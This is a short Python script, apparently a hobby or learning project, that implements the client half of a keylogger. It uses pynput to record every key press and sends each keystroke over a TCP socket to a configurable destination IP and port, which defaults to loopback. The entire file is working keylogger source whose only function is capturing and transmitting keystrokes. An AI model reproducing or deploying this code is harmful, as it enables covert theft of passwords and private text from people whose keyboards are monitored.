#!/usr/bin/python

from pynput.keyboard import Key, Listener
from socket import *
import optparse

"""
Sends keysrokes to a specified IP address on a specified port.
This script is the second part of a two part program, logger_server_parse2.py being the first.
The IP is set to loopback but can be using the -d or --dst flag.
Default port is set to 12345 and can be changed using the -p or --prt flag.
The default settings will run locally.
"""

class Client(object):

	def __init__(self, ip='127.0.0.1', port=12345):
		self.port = port
		self.ip = ip

	def on_press(self, key):
		with socket(AF_INET, SOCK_STREAM) as s:
			if s.connect_ex((self.ip, self.port)):
				pass
			else:
				s.sendall(str(key).encode())

def main():

	parser = optparse.OptionParser('A simple client that sends keystrokes to a server for logging')
	parser.add_option('-d', '--dst', dest='dst', type='str', help='IP address of server/destination (default: "127.0.0.1")')
	parser.add_option('-p', '--prt', dest='prt', type='int', help='Port number to connect (default: 12345)')
	(options, args) = parser.parse_args()
	client = Client()

	if options.dst is None:
#		print(f"[!] Enter IP address of server/destination")
#		exit(0)
		pass
	else:
		client.ip = options.dst

	if options.prt is None:
#		print(f"[!] Enter port number to connect")
#		exit(0)
		pass
	else:
		client.port = options.prt

	with Listener(on_press=client.on_press) as l:
		l.join()

if __name__ == '__main__':
	main()
